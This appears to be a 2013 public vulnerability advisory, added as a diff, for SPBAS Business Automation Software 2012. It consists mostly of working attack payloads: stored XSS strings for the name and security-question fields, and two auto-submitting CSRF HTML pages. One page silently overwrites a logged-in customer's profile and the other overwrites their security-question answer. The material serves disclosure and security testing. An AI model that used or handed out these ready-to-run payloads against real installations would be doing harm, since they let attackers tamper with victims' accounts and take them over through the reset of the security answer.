@@ -1,0 +1,58 @@
+# SPBAS Business Automation Software- XSS & CSRF Vulnerability
+# Date: 16 June 2013
+# Author: Christy Philip Mathew - www.offcon.org
+# Vendor or Software Link: http://www.spbas.com
+# Version: 2012
+
+
+*1.XSS Vulnerability*
+
+(a) Client Area -> My Info -> Update the first name and last name to
+
+john"><img src=x onerror=prompt(0);>
+
+(b) Update the security question to
+
+john"><img src=x onerror=prompt(0);>
+
+
+*2.Cross Site Request Forgery*
+
+(a) Change Customer Information
+
+<html>
+
+     <body onload=document.forms[0].submit();>
+    <form action="http://website.com/customers/index.php" method="POST">
+      <input type="hidden" name="task" value="my_account" />
+      <input type="hidden" name="tab" value="my_info" />
+      <input type="hidden" name="update_my_info" value="y" />
+      <input type="hidden" name="first_name" value="hacked" />
+      <input type="hidden" name="last_name" value="hacked" />
+      <input type="hidden" name="username" value="hacked" />
+      <input type="hidden" name="form_submission"
+value="Save Changes" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+(b) Change Security Question Answer
+
+<html>
+
+   <body onload=document.forms[0].submit();>
+    <form action="http://website.com/customers/index.php" method="POST">
+      <input type="hidden" name="task" value="my_account" />
+      <input type="hidden" name="tab" value="security_question" />
+      <input type="hidden" name="change_security_question"
+value="y" />
+      <input type="hidden" name="question" value="1" />
+      <input type="hidden" name="answer" value="test" />
+      <input type="hidden" name="form_submission"
+value="Save Changes" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
